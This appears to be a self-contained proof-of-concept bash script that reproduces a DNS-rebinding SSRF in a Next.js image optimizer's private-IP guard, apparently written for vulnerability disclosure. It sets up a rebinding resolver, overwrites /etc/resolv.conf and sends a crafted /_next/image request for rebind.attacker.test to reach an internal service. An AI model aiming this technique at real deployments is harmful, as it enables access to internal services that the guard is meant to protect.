#!/bin/bash
# Self-contained PoC: the image optimizer's private-IP SSRF guard is a TOCTOU
# check. fetchExternalImage() resolves the hostname with dns.lookup() and
# rejects private addresses, then calls fetch(), which resolves the SAME name
# AGAIN. The two resolutions can disagree.
#
# Run from /home/user/nextlab.  Everything is local: a rebinding DNS responder
# on 127.0.0.1:53, an "internal" service on 127.0.0.1:80, and the Next.js app
# on :3000.
set -u
cd /home/user/nextlab

cleanup() {
  cp resolv.conf.bak /etc/resolv.conf 2>/dev/null
  for p in $(ps -eo pid,args | awk '/rebind_dns\.py/ && !/awk/ {print $1}'); do kill -9 "$p" 2>/dev/null; done
}
trap cleanup EXIT

echo "=== 0. environment ==="
echo "next: $(node -e 'console.log(require("/home/user/nextlab/node_modules/next/package.json").version)')"
echo "images.remotePatterns:"; sed -n '/remotePatterns/,/],/p' next.config.js | sed 's/^/    /'

# internal-only service
if ! curl -s -o /dev/null --max-time 2 http://127.0.0.1/ping; then
  setsid python3 canary.py > canary.log 2>&1 < /dev/null &
  sleep 2
fi
: > canary.log

# rebinding resolver: first A answer public, subsequent answers 127.0.0.1
cp /etc/resolv.conf resolv.conf.bak 2>/dev/null
setsid python3 rebind_dns.py 53 > dns53.log 2>&1 < /dev/null &
sleep 2
printf 'nameserver 127.0.0.1\noptions timeout:2 attempts:2\n' > /etc/resolv.conf

# next must be started AFTER resolv.conf so its resolver picks it up
for p in $(ps -eo pid,args | awk '/next-server/ && !/awk/ {print $1}'); do kill "$p" 2>/dev/null; done
sleep 2
: > server.log
PORT=3000 setsid npx next start > server.log 2>&1 < /dev/null &
sleep 9

echo
echo "=== 1. the guard, in isolation: the name currently resolves public ==="
python3 - <<'PY'
import socket
print("   getaddrinfo #1 ->", socket.getaddrinfo("rebind.attacker.test", 80, socket.AF_INET)[0][4][0])
PY

echo
echo "=== 2. attacker request to the image optimizer ==="
echo "    GET /_next/image?url=http://rebind.attacker.test/x.png&w=640&q=75"
sleep 6   # let the responder's per-run counter reset
curl -s -o /dev/null -w "    http status = %{http_code}\n" \
  "http://127.0.0.1:3000/_next/image?url=http%3A%2F%2Frebind.attacker.test%2Fx.png&w=640&q=75"
sleep 1

echo
echo "=== 3. DNS answers actually served, in order ==="
grep -E "A query|reset" dns53.log | sed 's/^/   /'
echo "    (#1 is the guard's dns.lookup(); #2 is fetch()'s own resolution)"

echo
echo "=== 4. did the request reach the internal service on 127.0.0.1:80? ==="
if [ -s canary.log ]; then
  sed 's/^/   /' canary.log
  echo "    -> SSRF DELIVERED despite the private-IP guard"
else
  echo "   (no hits - not reproduced this run)"
fi

echo
echo "=== 5. what Next.js logged ==="
grep -E "upstream image|valid image" server.log | sed 's/^/   /' || echo "   (none)"
